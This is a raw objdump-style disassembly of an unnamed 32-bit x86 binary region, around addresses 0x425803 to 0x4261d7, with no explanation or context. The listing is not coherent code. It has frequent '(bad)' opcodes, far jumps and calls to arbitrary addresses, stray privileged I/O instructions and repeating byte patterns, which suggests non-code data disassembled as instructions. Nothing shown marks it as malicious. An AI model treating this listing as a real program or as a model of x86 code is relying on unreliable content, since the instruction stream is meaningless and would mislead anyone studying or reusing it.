  425803:	shr    BYTE PTR [eax],0xfe
  425806:	jne    0x4257bc
  425808:	mov    ?,esi
  42580a:	cmp    bl,bh
  42580c:	push   ecx
  42580d:	cmp    eax,0x489ac0f7
  425812:	mov    bh,0x76
  425814:	jmp    0x6145:0x1022f790
  42581b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42581c:	lods   al,BYTE PTR ds:[esi]
  42581d:	push   cs
  42581e:	sbb    eax,DWORD PTR [ebx+0x7b9001d]
  425824:	mov    eax,0xe6b873fb
  425829:	cld    
  42582a:	jnp    0x4257e4
  42582c:	jmp    0x684f9869
  425831:	ret    
  425832:	inc    ecx
  425833:	sbb    DWORD PTR [eax-0x73],ecx
  425836:	pop    esi
  425837:	addr16 or bl,cl
  42583a:	push   eax
  42583b:	jo     0x4257d8
  42583d:	adc    esi,DWORD PTR [eax]
  42583f:	cmp    dh,BYTE PTR [edi+esi*8-0x6a]
  425843:	sub    DWORD PTR [ebx],ebx
  425845:	sbb    al,0x13
  425847:	or     BYTE PTR [eax+0x4c418e26],cl
  42584d:	cwde   
  42584e:	imul   eax,DWORD PTR [eax+edx*1+0x150ea5f2],0x71
  425856:	jns    0x42585d
  425858:	data16 sahf 
  42585a:	sbb    eax,DWORD PTR [edi+0x111da299]
  425860:	iret   
  425861:	mov    ebp,0x7b92e7db
  425866:	and    DWORD PTR [ebx+edi*2+0x2e],0x314b9a4
  42586e:	and    eax,0x5ba636bd
  425873:	rol    DWORD PTR [edi+0x28],0x1a
  425877:	cdq    
  425878:	mov    bh,0x1e
  42587a:	icebp  
  42587b:	xchg   edx,eax
  42587c:	jmp    0x4258a5
  42587e:	adc    eax,0x673e297
  425883:	adc    ebx,DWORD PTR [edx+0x3ef3c6af]
  425889:	xchg   edx,eax
  42588a:	mov    edx,0x85ac81df
  42588f:	imul   edx,DWORD PTR fs:[eax],0xffffff98
  425893:	stc    
  425894:	shr    BYTE PTR [edi+0x73],1
  425897:	xchg   DWORD PTR [edx+0x3d],ecx
  42589a:	fld    DWORD PTR [eax]
  42589c:	and    ebx,DWORD PTR [edi+edx*2]
  42589f:	add    ch,cl
  4258a1:	call   FWORD PTR [edx+0x16cbaa2]
  4258a7:	jg     0x425855
  4258a9:	push   ecx
  4258aa:	xor    ecx,ebp
  4258ac:	dec    ecx
  4258ad:	push   esi
  4258ae:	inc    ecx
  4258af:	cmp    esi,ebx
  4258b1:	pop    ss
  4258b2:	xchg   ecx,eax
  4258b3:	xor    BYTE PTR [edi+0x2b],ah
  4258b6:	ss xor al,0x61
  4258b9:	push   eax
  4258ba:	or     eax,0x1f895c0f
  4258bf:	je     0x4258ea
  4258c1:	(bad)  
  4258c2:	cmp    eax,0x5b6ebd2e
  4258c7:	cwde   
  4258c8:	jbe    0x42593e
  4258ca:	dec    eax
  4258cb:	jg     0x4258a0
  4258cd:	cmp    ah,BYTE PTR [ebx+0xd9faa51]
  4258d3:	and    eax,DWORD PTR [ecx-0x18e5008c]
  4258d9:	push   es
  4258da:	dec    ebx
  4258db:	push   es
  4258dc:	pushf  
  4258dd:	popa   
  4258de:	sbb    DWORD PTR [eax+0x28026c64],0xffffffd4
  4258e5:	gs pop eax
  4258e7:	scas   al,BYTE PTR es:[edi]
  4258e8:	cli    
  4258e9:	sub    DWORD PTR [esi],esp
  4258eb:	xor    al,0xf1
	...
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	shr    DWORD PTR [edx-0x6d547134],cl
  425968:	add    DWORD PTR [eax],eax
  42596a:	inc    DWORD PTR [eax]
  42596c:	add    BYTE PTR [eax],al
  42596e:	das    
  42596f:	(bad)  
  425970:	and    BYTE PTR [edx-0x38608d0f],bl
  425976:	fs cmc 
  425978:	daa    
  425979:	add    al,BYTE PTR [esi+0x3191a418]
  42597f:	ins    BYTE PTR es:[edi],dx
  425980:	xor    eax,0x49ff32bb
  425986:	mov    ebx,0x216b7586
  42598b:	out    dx,eax
  42598c:	scas   eax,DWORD PTR es:[edi]
  42598d:	sar    DWORD PTR [ebx+edi*1-0x77],0x64
  425992:	retf   0x35c2
  425995:	add    DWORD PTR [esi+0x55],0x24
  425999:	push   es
  42599a:	cli    
  42599b:	ss gs sbb ebx,ebx
  42599f:	mov    dl,0xc7
  4259a1:	mov    dl,0xea
  4259a3:	and    eax,0xce2d9c76
  4259a8:	std    
  4259a9:	fsub   QWORD PTR [eax-0x64019b4c]
  4259af:	sbb    DWORD PTR [edx],0xe51f8668
  4259b5:	or     DWORD PTR [ecx+0x79],0xffffffae
  4259b9:	enter  0xb4b8,0xde
  4259bd:	test   eax,0x8ed1b8
  4259c2:	es push edi
  4259c4:	ficom  WORD PTR ds:0x1d0d3e51
  4259ca:	rcr    DWORD PTR [esi+0x6d],1
  4259cd:	pop    edx
  4259ce:	dec    edx
  4259cf:	aad    0xcf
  4259d1:	jnp    0x4259f4
  4259d3:	dec    si
  4259d5:	and    eax,0x75286fb2
  4259da:	in     eax,dx
  4259db:	add    BYTE PTR [eax+0x3674d4b9],0x88
  4259e2:	es dec ecx
  4259e4:	push   0x9036a46d
  4259e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259ea:	clc    
  4259eb:	cmp    cl,0xa8
  4259ee:	std    
  4259ef:	or     eax,0x915ef3fe
  4259f4:	lods   al,BYTE PTR ds:[esi]
  4259f5:	push   ecx
  4259f6:	add    cl,BYTE PTR [eax]
  4259f8:	lods   eax,DWORD PTR ds:[esi]
  4259f9:	add    ebp,DWORD PTR ds:0x40fb9c00
  4259ff:	or     eax,DWORD PTR [ecx+ebx*1]
  425a02:	and    dl,BYTE PTR [eax+eax*1+0x10c0c316]
  425a09:	xor    eax,DWORD PTR [ebp+0x5b]
  425a0c:	stos   BYTE PTR es:[edi],al
  425a0d:	es out 0x8c,eax
  425a10:	call   0xe5879277
  425a15:	fs popf 
  425a17:	(bad)  
  425a19:	stc    
  425a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a1b:	stos   DWORD PTR es:[edi],eax
  425a1c:	jg     0x425a83
  425a1e:	push   ebx
  425a1f:	dec    esp
  425a20:	ins    BYTE PTR es:[edi],dx
  425a21:	lods   al,BYTE PTR ds:[esi]
  425a22:	xlat   BYTE PTR ds:[ebx]
  425a23:	not    DWORD PTR [esi+0x2bb9a803]
  425a29:	test   al,0x7c
  425a2b:	xchg   ebx,eax
  425a2c:	mov    es,WORD PTR [eax-0x59]
  425a2f:	dec    ebx
  425a30:	inc    esp
  425a31:	xchg   esp,eax
  425a32:	clc    
  425a33:	out    0xa3,eax
  425a35:	std    
  425a36:	retf   0x92f0
  425a39:	cdq    
  425a3a:	or     al,0xf8
  425a3c:	(bad)  
  425a3d:	shl    DWORD PTR [esi-0x54],1
  425a40:	adc    eax,0xd416f3b9
  425a45:	push   esi
  425a46:	pop    esp
  425a47:	xor    BYTE PTR [ebx+0x64],dl
  425a4a:	and    BYTE PTR [esp+ecx*8+0x2dd1cd64],al
  425a51:	sub    BYTE PTR [edi],cl
  425a53:	pop    eax
  425a54:	and    DWORD PTR [esi],esi
  425a56:	mov    dh,0x38
  425a58:	push   edx
  425a59:	lods   eax,DWORD PTR ds:[esi]
  425a5a:	mov    edx,0x7d9ee519
  425a5f:	int3   
  425a60:	test   DWORD PTR [esi-0x4d],eax
  425a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a64:	adc    BYTE PTR [eax-0x73ad9406],dl
  425a6a:	(bad)  
  425a6b:	dec    ecx
  425a6c:	push   eax
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x62cb0b44]
  425ae6:	stos   BYTE PTR es:[edi],al
  425ae7:	xchg   ebx,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	inc    DWORD PTR [eax]
  425aec:	add    BYTE PTR [eax],al
  425aee:	ja     0x425ade
  425af0:	repz inc eax
  425af2:	push   edx
  425af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425af4:	jmp    0xa23b:0x9adedb5b
  425afb:	pushf  
  425afc:	aam    0x10
  425afe:	sub    edi,0x800fa275
  425b04:	sub    al,BYTE PTR [edx]
  425b06:	xchg   esi,eax
  425b07:	popf   
  425b08:	mov    ds:0xe245001c,al
  425b0d:	sar    DWORD PTR [ebx+ecx*1+0x1f],cl
  425b11:	ret    
  425b12:	pop    ecx
  425b13:	inc    ebx
  425b14:	aaa    
  425b15:	xchg   esi,eax
  425b16:	mov    BYTE PTR [eax-0x26],dh
  425b19:	dec    ebp
  425b1a:	pop    eax
  425b1b:	sbb    al,0x36
  425b1d:	das    
  425b1e:	arpl   WORD PTR [ebp+ebx*8-0x1e],bp
  425b22:	pop    ebx
  425b23:	pop    edx
  425b24:	mov    bh,BYTE PTR [ecx-0x67fb4e51]
  425b2a:	mov    ?,WORD PTR [eax]
  425b2c:	mov    gs,edx
  425b2e:	ins    BYTE PTR es:[edi],dx
  425b2f:	mov    fs,WORD PTR [esi+ebp*4]
  425b32:	shr    edx,cl
  425b34:	cmp    ch,BYTE PTR [ebx-0x42]
  425b37:	je     0x425ba2
  425b39:	sub    BYTE PTR [eax+0x7a481d5],cl
  425b3f:	ja     0x425b77
  425b41:	sub    al,0xce
  425b43:	cmp    eax,0x22f40b62
  425b48:	push   esi
  425b49:	push   0xfffffffb
  425b4b:	(bad)  
  425b4c:	push   cs
  425b4d:	and    al,BYTE PTR [ecx+0x6]
  425b50:	imul   BYTE PTR [ebx+0x10beb5db]
  425b56:	sbb    eax,DWORD PTR [ecx-0x425da4d5]
  425b5c:	mov    ds:0xb8e37dbb,eax
  425b61:	mov    eax,0xfccfa535
  425b66:	das    
  425b67:	ficom  DWORD PTR [ecx]
  425b69:	in     al,0xfa
  425b6b:	shr    BYTE PTR ds:[edi+0x25],cl
  425b6f:	rcr    DWORD PTR [esi+ebp*2],cl
  425b72:	jg     0x425b5f
  425b74:	jl     0x425af7
  425b76:	loop   0x425bc5
  425b78:	push   esp
  425b79:	pop    esp
  425b7a:	stos   DWORD PTR es:[edi],eax
  425b7b:	lahf   
  425b7c:	sbb    edi,edi
  425b7e:	scas   eax,DWORD PTR es:[edi]
  425b7f:	shr    BYTE PTR [ecx+edx*1],cl
  425b82:	shl    BYTE PTR [esi],cl
  425b84:	fnstcw WORD PTR [eax-0x2e]
  425b87:	mov    gs,WORD PTR [ebx-0x30]
  425b8a:	or     eax,0x2a069e97
  425b8f:	sub    bh,BYTE PTR [edx]
  425b91:	stc    
  425b92:	mov    ebp,0x6f84aed5
  425b97:	into   
  425b98:	or     DWORD PTR [eax-0x4f],ecx
  425b9b:	cmp    eax,0x4c020c2a
  425ba0:	or     al,0xbf
  425ba2:	addr16 jp 0x425bfa
  425ba5:	pop    ds
  425ba6:	push   ebx
  425ba7:	out    0x8a,al
  425ba9:	(bad)  
  425baa:	jl     0x425b6a
  425bac:	dec    edi
  425bad:	test   BYTE PTR [eax],dh
  425baf:	mov    ebp,0x24126adf
  425bb4:	stos   DWORD PTR es:[edi],eax
  425bb5:	mov    ebp,0x5be452f8
  425bba:	fwait
  425bbb:	aad    0x3b
  425bbd:	fst    DWORD PTR [esi]
  425bbf:	scas   eax,DWORD PTR es:[edi]
  425bc0:	mov    eax,ds:0x4183837c
  425bc5:	push   esi
  425bc6:	fs pop edx
  425bc8:	in     al,0x57
  425bca:	lods   al,BYTE PTR ds:[esi]
  425bcb:	into   
  425bcc:	lods   al,BYTE PTR ds:[esi]
  425bcd:	ret    
  425bce:	push   es
  425bcf:	scas   eax,DWORD PTR es:[edi]
  425bd0:	push   ecx
  425bd1:	mov    ecx,0x6de192b2
  425bd6:	or     eax,0xb141d861
  425bdb:	xchg   esp,eax
  425bdc:	and    al,BYTE PTR [esi+esi*2-0x3f]
  425be0:	xor    edi,esp
  425be2:	ja     0x425b78
  425be4:	xchg   esp,eax
  425be5:	add    esi,DWORD PTR [edx-0x65]
  425be8:	lods   al,BYTE PTR ds:[esi]
  425be9:	xor    esp,ecx
  425beb:	lock add DWORD PTR [eax],eax
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	arpl   WORD PTR [edx-0x6b5601f9],si
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	inc    DWORD PTR [eax]
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	pop    eax
  425c6f:	cmp    DWORD PTR [ebx],ebp
  425c71:	inc    ecx
  425c72:	xchg   ch,bh
  425c74:	loope  0x425c3c
  425c76:	or     esi,ebp
  425c78:	pop    ecx
  425c79:	int3   
  425c7a:	je     0x425c91
  425c7c:	stos   BYTE PTR es:[edi],al
  425c7d:	outs   dx,BYTE PTR ds:[esi]
  425c7e:	cs mov esi,0xd998cb76
  425c84:	(bad)  
  425c85:	mov    bh,0x56
  425c87:	adc    DWORD PTR [edx-0x7218863f],ebx
  425c8d:	inc    edx
  425c8e:	icebp  
  425c8f:	push   ebp
  425c90:	mov    ch,0x6f
  425c92:	hlt    
  425c93:	idiv   BYTE PTR [edx+0x67fae734]
  425c99:	add    al,BYTE PTR [ebp+0x5b]
  425c9c:	call   0xfacb8f81
  425ca1:	mov    ah,0xab
  425ca3:	pop    edi
  425ca4:	xor    al,0x95
  425ca6:	push   ss
  425ca7:	push   ds
  425ca8:	fwait
  425ca9:	inc    edi
  425caa:	imul   ebp,DWORD PTR [ebp-0x4],0x2
  425cae:	dec    esp
  425caf:	stc    
  425cb0:	dec    ebp
  425cb1:	lods   al,BYTE PTR ds:[esi]
  425cb2:	repz push eax
  425cb4:	in     al,dx
  425cb5:	fstp   DWORD PTR [ebp+0x48]
  425cb8:	and    DWORD PTR [ecx],0x29
  425cbb:	cwde   
  425cbc:	xchg   ebp,eax
  425cbd:	and    ebx,DWORD PTR [bx+0x72]
  425cc1:	add    dl,BYTE PTR [edi-0x6d]
  425cc4:	sbb    dh,BYTE PTR [edi+0x3629bfae]
  425cca:	mov    bh,0xf1
  425ccc:	test   DWORD PTR [edi-0x5a],ebp
  425ccf:	add    edx,DWORD PTR [esi]
  425cd1:	ret    
  425cd2:	loopne 0x425d04
  425cd4:	mov    ch,0x9c
  425cd6:	arpl   WORD PTR [ecx+0x36bd4276],bx
  425cdc:	lods   eax,DWORD PTR ds:[esi]
  425cdd:	rep outs dx,DWORD PTR ds:[esi]
  425cdf:	fwait
  425ce0:	and    esi,DWORD PTR [ebp-0x32f7ea90]
  425ce6:	iret   
  425ce7:	pop    es
  425ce8:	outs   dx,BYTE PTR ds:[esi]
  425ce9:	mov    eax,esp
  425ceb:	aaa    
  425cec:	dec    esp
  425ced:	pop    eax
  425cee:	xchg   ecx,eax
  425cef:	sub    BYTE PTR [ebx],al
  425cf1:	jmp    0xaac71fba
  425cf6:	xchg   esp,eax
  425cf7:	fbstp  TBYTE PTR [edx]
  425cf9:	push   cs
  425cfa:	mov    ah,0x6
  425cfc:	cmp    BYTE PTR [ebp-0x758e2924],dh
  425d02:	out    dx,al
  425d03:	imul   esp,DWORD PTR [ecx+0x1],0xffffffb3
  425d07:	inc    eax
  425d08:	xor    BYTE PTR [edi+0x1],ah
  425d0b:	adc    edi,DWORD PTR [bp+si+0x5d]
  425d0f:	lock xchg ebp,eax
  425d11:	dec    ebx
  425d12:	int3   
  425d13:	mov    ebp,0x79518542
  425d18:	and    ebp,edi
  425d1a:	into   
  425d1b:	aam    0x11
  425d1d:	pop    edi
  425d1e:	xchg   esp,eax
  425d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d20:	and    dl,BYTE PTR [ecx]
  425d22:	fs add ax,0x5d77
  425d27:	(bad)  
  425d28:	jmp    0x8e48:0x139ed8be
  425d2f:	cmp    al,dl
  425d31:	adc    eax,0xf6868bf8
  425d36:	(bad)  
  425d37:	lods   al,BYTE PTR ds:[esi]
  425d38:	ror    DWORD PTR [ebp+ebx*1-0x22],0x5e
  425d3d:	fidivr DWORD PTR [ecx+0x2d769cc4]
  425d43:	jmp    0x417b23b8
  425d48:	add    eax,0x8ba0fb59
  425d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d4e:	cmp    cl,bh
  425d50:	shl    DWORD PTR [ecx+0x56b134c3],1
  425d56:	fst    st(1)
  425d58:	adc    ebx,DWORD PTR [edx-0x245d8d6f]
  425d5e:	adc    al,0x52
  425d60:	retf   
  425d61:	aaa    
  425d62:	xlat   BYTE PTR ds:[ebx]
  425d63:	daa    
  425d64:	sbb    ah,ah
  425d66:	cdq    
  425d67:	xchg   esp,eax
  425d68:	mov    BYTE PTR [ebx+0x1abf66],bh
	...
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0xfcbb40c7,al
  425de6:	test   al,0x95
  425de8:	add    DWORD PTR [eax],eax
  425dea:	inc    DWORD PTR [eax]
  425dec:	add    BYTE PTR [eax],al
  425dee:	test   DWORD PTR [edi],ebx
  425df0:	(bad)  [edx-0x72]
  425df3:	or     ah,0x62
  425df6:	xchg   DWORD PTR [esi],esp
  425df8:	pushf  
  425df9:	and    ecx,edx
  425dfb:	push   edx
  425dfc:	inc    edi
  425dfd:	inc    edi
  425dfe:	jmp    0xcb91:0xd12d8d45
  425e05:	sub    esp,DWORD PTR [edx+0x49]
  425e08:	in     eax,0x22
  425e0a:	cmovne esp,DWORD PTR [esi]
  425e0d:	adc    al,0xbc
  425e0f:	jmp    0x425e53
  425e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e12:	sbb    eax,0xf94a9b0a
  425e17:	aad    0xd5
  425e19:	out    dx,eax
  425e1a:	mov    bh,0x6c
  425e1c:	dec    esp
  425e1d:	xchg   DWORD PTR [edx-0x49],edi
  425e20:	pop    es
  425e21:	(bad)  
  425e23:	call   0xd6c:0x5c02f447
  425e2a:	jb     0x425e89
  425e2c:	bnd ret 0x9000
  425e30:	push   edx
  425e31:	mov    ebp,0x7148f25c
  425e36:	cmc    
  425e37:	adc    BYTE PTR [edi+0x11],al
  425e3a:	out    0xf3,al
  425e3c:	cmp    ebx,ebx
  425e3e:	and    eax,0x9688dc4c
  425e43:	or     BYTE PTR [eax+0x69],0x95
  425e47:	jne    0x425eb8
  425e49:	into   
  425e4a:	and    eax,0x8c9ddb5b
  425e4f:	xchg   edi,eax
  425e50:	mov    ah,0x8c
  425e52:	aad    0x3d
  425e54:	and    al,0x1b
  425e56:	sub    cl,0x1a
  425e59:	xchg   edi,eax
  425e5a:	xchg   ebx,eax
  425e5b:	sbb    al,0xff
  425e5d:	sub    ah,ah
  425e5f:	jp     0x425e06
  425e61:	xor    ah,BYTE PTR [ecx]
  425e63:	pop    ss
  425e64:	adc    ebp,DWORD PTR [ecx]
  425e66:	ret    
  425e67:	dec    esp
  425e68:	sub    DWORD PTR [esi+0x3b23ab93],ebp
  425e6e:	stc    
  425e6f:	add    eax,0x466d4731
  425e74:	enter  0x8c92,0xd9
  425e78:	fwait
  425e79:	jbe    0x425e8b
  425e7b:	test   DWORD PTR [ebx],esp
  425e7d:	jecxz  0x425e74
  425e7f:	ss iret 
  425e81:	mov    bl,0xcf
  425e83:	fsubr  DWORD PTR [ecx]
  425e85:	mov    ebp,0xba7f6c3c
  425e8a:	push   0x15108624
  425e8f:	fs clc 
  425e91:	test   BYTE PTR [esi-0x18],bl
  425e94:	mov    ebp,0x20145ad4
  425e99:	dec    edi
  425e9a:	add    bl,BYTE PTR [ebp-0x80]
  425e9d:	xchg   ecx,eax
  425e9e:	je     0x425e7f
  425ea0:	push   edx
  425ea1:	enter  0x916f,0x3c
  425ea5:	out    0x3e,eax
  425ea7:	xor    edx,ecx
  425ea9:	cmp    al,0x9a
  425eab:	out    0x66,eax
  425ead:	dec    edi
  425eae:	shl    DWORD PTR [edi+0x63],1
  425eb1:	sub    BYTE PTR [edi+0x49],dl
  425eb4:	arpl   WORD PTR [ecx+0xe6192b6],di
  425eba:	jmp    0x6cc0fd9
  425ebf:	or     esi,DWORD PTR [edx-0x8]
  425ec2:	not    DWORD PTR [ebp-0x230fc15a]
  425ec8:	out    0xb9,al
  425eca:	cwde   
  425ecb:	xor    ebx,DWORD PTR [ebx]
  425ecd:	push   edi
  425ece:	pop    ebp
  425ecf:	xchg   esp,eax
  425ed0:	retf   0x4bf1
  425ed3:	cmp    al,0x5a
  425ed5:	sub    ecx,esi
  425ed7:	(bad)  
  425ed8:	push   edi
  425ed9:	(bad)  
  425eda:	ficom  WORD PTR [eax-0x455551e6]
  425ee0:	mul    DWORD PTR [esi-0x53]
  425ee3:	fidivr WORD PTR [eax-0x51]
  425ee6:	in     eax,dx
  425ee7:	repz imul edi,DWORD PTR [edx],0xffffffe3
  425eeb:	out    0xd,al
	...
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	sub    eax,0xa70b84f7
  425f67:	xchg   esi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	inc    DWORD PTR [eax]
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	pop    esp
  425f6f:	jmp    DWORD PTR [edx+edi*4-0x479b06a]
  425f76:	mov    ecx,0x2a5fa0a2
  425f7b:	push   edi
  425f7c:	retf   
  425f7d:	push   es
  425f7e:	les    edx,FWORD PTR [esi-0x77286f6b]
  425f84:	(bad)  
  425f86:	push   esi
  425f87:	lock and eax,0x63976e9b
  425f8d:	push   esi
  425f8e:	add    eax,0x642ce5ee
  425f93:	sub    DWORD PTR [edx-0x3714c161],ebp
  425f99:	jnp    0x425f60
  425f9b:	jns    0x425f25
  425f9d:	out    0x21,al
  425f9f:	popf   
  425fa0:	fadd   st,st(3)
  425fa2:	jns    0x426018
  425fa4:	pop    eax
  425fa5:	push   ebp
  425fa6:	ret    0x7046
  425fa9:	in     eax,0x91
  425fab:	(bad)  
  425fac:	xlat   BYTE PTR ds:[ebx]
  425fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fae:	lock outs dx,BYTE PTR ds:[esi]
  425fb0:	loope  0x425f56
  425fb2:	xor    DWORD PTR [eax-0x5338c958],eax
  425fb8:	inc    esp
  425fb9:	mov    al,ds:0x91394400
  425fbe:	ins    BYTE PTR es:[edi],dx
  425fbf:	add    al,0xd5
  425fc1:	arpl   WORD PTR [esi+eiz*1],sp
  425fc4:	mov    ch,0x6b
  425fc6:	pop    edx
  425fc7:	jmp    0xd9e662d3
  425fcc:	push   ecx
  425fcd:	ror    DWORD PTR [edi],1
  425fcf:	dec    ebx
  425fd0:	jl     0x425f53
  425fd2:	popf   
  425fd3:	aaa    
  425fd4:	outs   dx,BYTE PTR ds:[esi]
  425fd5:	fst    QWORD PTR [edi]
  425fd7:	mov    ch,BYTE PTR [edx+0x45ce1273]
  425fdd:	fdivr  DWORD PTR [ebp-0x7b]
  425fe0:	(bad)  
  425fe1:	push   0xffffffa2
  425fe3:	out    dx,al
  425fe4:	nop
  425fe5:	xchg   edi,eax
  425fe6:	inc    eax
  425fe7:	pushf  
  425fe8:	and    BYTE PTR [ecx],dl
  425fea:	fisub  WORD PTR [ebx-0x599338c0]
  425ff0:	xor    eax,0xee2859e5
  425ff5:	dec    edx
  425ff6:	jl     0x426041
  425ff8:	ror    BYTE PTR [ecx+edx*8-0x1b],1
  425ffc:	out    0xc5,eax
  425ffe:	or     eax,edx
  426000:	inc    eax
  426001:	fiadd  WORD PTR [edx]
  426003:	jg     0x425ff3
  426005:	call   0x28f2:0x5058bffc
  42600c:	inc    si
  42600e:	sbb    eax,0x8831f1ae
  426013:	pop    ds
  426014:	jne    0x426010
  426016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426017:	out    dx,al
  426018:	or     BYTE PTR [ecx+0x228a45a9],dl
  42601e:	repnz push 0xffffffe7
  426021:	xchg   esi,eax
  426022:	cmp    ecx,edi
  426024:	scas   al,BYTE PTR es:[edi]
  426025:	in     al,0xb8
  426027:	inc    esi
  426028:	push   edx
  426029:	xchg   DWORD PTR [ebx+0x4b],edi
  42602c:	and    DWORD PTR [eax],esp
  42602e:	(bad)  
  42602f:	aad    0xe5
  426031:	xchg   esp,eax
  426032:	xor    edx,DWORD PTR [esi+0x56]
  426035:	add    bh,al
  426037:	push   ebp
  426038:	loopne 0x426082
  42603a:	ret    0x90c7
  42603d:	mov    bl,BYTE PTR [eax]
  42603f:	xchg   DWORD PTR [esi+eiz*8],edi
  426042:	and    eax,0x5915524b
  426047:	retf   0x2c95
  42604a:	mov    edx,0xeb7a7328
  42604f:	mov    dl,0xfc
  426051:	sahf   
  426052:	dec    eax
  426053:	mov    bl,0xd3
  426055:	xchg   edi,eax
  426056:	(bad)  
  426057:	push   eax
  426058:	dec    ecx
  426059:	push   ebx
  42605a:	lds    ebp,FWORD PTR [ecx+edi*1]
  42605d:	jmp    0x426048
  42605f:	mov    ebp,DWORD PTR [eax-0x1d]
  426062:	(bad)  
  426063:	sub    eax,0x1ce4c1de
  426068:	shl    ecx,cl
  42606a:	push   es
  42606b:	sub    DWORD PTR [esi+0x0],esi
	...
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	dec    edi
  4260e3:	(bad)
  4260e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e7:	xchg   edi,eax
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	inc    DWORD PTR [eax]
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	cs test ah,ah
  4260f1:	in     eax,dx
  4260f2:	outs   dx,DWORD PTR ds:[esi]
  4260f3:	enter  0x8e89,0xd8
  4260f7:	test   al,0x40
  4260f9:	jmp    0x42608d
  4260fb:	(bad)  
  4260fc:	leave  
  4260fd:	mov    edi,0x8b64134b
  426102:	sub    al,0x29
  426104:	inc    cl
  426106:	push   cs
  426107:	pop    esp
  426108:	mov    al,0x99
  42610a:	mov    eax,0xa61a26f6
  42610f:	pop    es
  426110:	lods   eax,DWORD PTR ds:[esi]
  426111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	fcom   DWORD PTR [ebx-0x366304c4]
  426118:	pop    edi
  426119:	mov    esi,0xcc8e2127
  42611e:	and    bl,ah
  426120:	cmp    DWORD PTR [edx],edi
  426122:	push   es
  426123:	fild   QWORD PTR [ebx]
  426125:	or     BYTE PTR cs:[ebx],0xac
  426129:	in     eax,dx
  42612a:	and    al,0xa9
  42612c:	(bad)  
  42612d:	in     al,0x5
  42612f:	xchg   BYTE PTR [edi],cl
  426131:	push   eax
  426132:	push   esp
  426133:	gs mov eax,0xb0cb7acf
  426139:	movhps xmm4,QWORD PTR [eax]
  42613c:	cmp    ecx,ecx
  42613e:	div    DWORD PTR [ecx+0x1f]
  426141:	and    DWORD PTR [edx+esi*4-0x1aa0acc0],0x5b5adfe5
  42614c:	pop    esp
  42614d:	or     BYTE PTR [edx-0x167361c3],ch
  426153:	and    al,0x99
  426155:	add    DWORD PTR [eax+0x6a],0x951574e6
  42615c:	pop    ebx
  42615d:	std    
  42615e:	sub    BYTE PTR [eax],ch
  426160:	mov    DWORD PTR [esp+eiz*2],edx
  426163:	div    DWORD PTR [esi+0x30]
  426166:	mov    edi,0x679ae2a
  42616b:	retf   0x5023
  42616e:	sub    bl,bh
  426170:	add    bh,BYTE PTR ds:0xe6e3319d
  426176:	add    ebp,0xb097f1a6
  42617c:	stos   BYTE PTR es:[edi],al
  42617d:	out    dx,eax
  42617e:	inc    edx
  42617f:	lods   al,BYTE PTR ds:[esi]
  426180:	xor    bh,BYTE PTR [esi-0x3ba168d5]
  426186:	push   es
  426187:	int3   
  426188:	test   esi,eax
  42618a:	int    0xc8
  42618c:	repz sbb ecx,DWORD PTR [ebp+0x3d69724f]
  426193:	je     0x4261d6
  426195:	xchg   al,al
  426197:	es pop esi
  426199:	ja     0x42616a
  42619b:	loope  0x426138
  42619d:	pop    edi
  42619e:	and    DWORD PTR [edx+edi*8+0x41],ebp
  4261a2:	or     dl,BYTE PTR [edi-0x46]
  4261a5:	shl    BYTE PTR [edi],cl
  4261a7:	sub    dh,BYTE PTR [ebp-0x2d]
  4261aa:	mov    dl,0x15
  4261ac:	jo     0x4261ab
  4261ae:	mov    bh,0xc5
  4261b0:	sbb    edx,DWORD PTR [ecx]
  4261b2:	bound  esp,QWORD PTR [eax+0x57181e99]
  4261b8:	ss nop
  4261ba:	pop    es
  4261bb:	pop    es
  4261bc:	pop    ecx
  4261bd:	mov    ebp,0x2386ddd8
  4261c2:	mov    ecx,0x6938af03
  4261c7:	into   
  4261c8:	sahf   
  4261c9:	jnp    0x426221
  4261cb:	pop    ebx
  4261cc:	mov    al,0xd8
  4261ce:	push   ss
  4261cf:	ins    DWORD PTR es:[edi],dx
  4261d0:	mov    ecx,0xe47ae69f
  4261d5:	loop   0x4261aa
  4261d7:	push   edx
